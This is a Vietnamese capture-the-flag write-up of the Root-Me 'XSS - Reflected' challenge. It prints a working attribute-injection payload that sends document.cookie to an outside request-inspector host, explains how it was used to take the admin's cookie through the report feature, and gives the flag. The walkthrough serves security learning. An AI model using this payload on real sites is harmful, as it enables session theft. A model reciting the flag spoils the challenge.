# Write up challenge XSS - Reflected

Tác giả:
- **Nguyễn Mỹ Quỳnh** <br>


[Link Challenge](https://www.root-me.org/en/Challenges/Web-Client/XSS-Reflected)<br>
</br>

Sau khi truy cập challenge ta thấy có một menu. Xem sơ các trang trong menu, ta chỉ thấy có trang contact là có form cho nhập input nhưng theo như ghi chú form sẽ không được check 

<img src="./img/1.png" alt="normal_acc_TRAbID"/> 

<img src="./img/contact.png" alt="normal_acc_TRAbID"/> 

<br>

Inspect thì phát hiện có một trang Security đã bị ẩn. Tiến hành mở ra thử thì đó là trang 404

<img src="./img/2.png" alt="normal_acc_TRAbID"/> 

<img src="./img/3.png" alt="normal_acc_TRAbID"/>

<img src="./img/4.png" alt="normal_acc_TRAbID"/>

<br>

Ta thấy có một nút Report to the administrator, inspect thì có thể thấy được url khi nhấn report (dùng burpsuite decode cho dễ nhìn)
<img src="./img/7.png" alt="normal_acc_TRAbID"/>

<img src="./img/6.png" alt="normal_acc_TRAbID"/>

<br>

Ta thấy đấy chính là url hiện tại, thử sửa url và kiểm tra lại, ta thấy url gửi lên admin cũng thay đổi tương ứng

<img src="./img/8.png" alt="normal_acc_TRAbID"/>

<img src="./img/9.png" alt="normal_acc_TRAbID"/>

<br>

Mặt khác, khi thay đổi url thuộc tính href trong thẻ `<a>` cũng thay đổi. Có thể đây chính là lỗ hổng. 

<img src="./img/5.png" alt="normal_acc_TRAbID"/>

<br>

Tuy nhiên khi chèn thử kiểm tra ta thấy nhiều kí tự html đã bị lọc, duy nhất 'không được lọc. Ta có thể lợi dụng điểm này để đóng thuộc tính href và chèn thêm thuộc tính khác.

<img src="./img/10.png" alt="normal_acc_TRAbID"/>

<br>

Vì challenge đã có ghi chú là addmin sẽ không nhấp vào bất cứ liên kết nào, nên thuộc tính ta chọn có thể là `onmousemove`. 
<br>
Tiên hành chèn code khai thác

    q' onmouseover='document.write(%22<img src=https://requestinspector.com/inspect/01fzesvkxb0b0x04gctmsqdf33?%22.concat(document.cookie).concat(%22 />%22))

<img src="./img/11.png" alt="normal_acc_TRAbID"/>

<br>

Sau đó di chuột qua element thì ta thấy câu lệnh được thực thi 

<img src="./img/12.png" alt="normal_acc_TRAbID"/>

<br>

Ta có được cookie của user 

<img src="./img/12_1.png" alt="normal_acc_TRAbID"/>

<br>

Bây giờ tiến hành chèn lại code vào url và hấn nút report to the administrator để gửi url lên admin, đợi admin vào trang di chuột qua element và ta sẽ có được cookie:

<img src="./img/13.png" alt="normal_acc_TRAbID"/>

<img src="./img/14.png" alt="normal_acc_TRAbID"/>

<br>

Có được flag:

<img src="./img/15.png" alt="normal_acc_TRAbID"/>

<br>

Submit thành công 

<img src="./img/16.png" alt="normal_acc_TRAbID"/>

<br><br>

> **Flag:** r3fL3ct3D_XsS_fTw

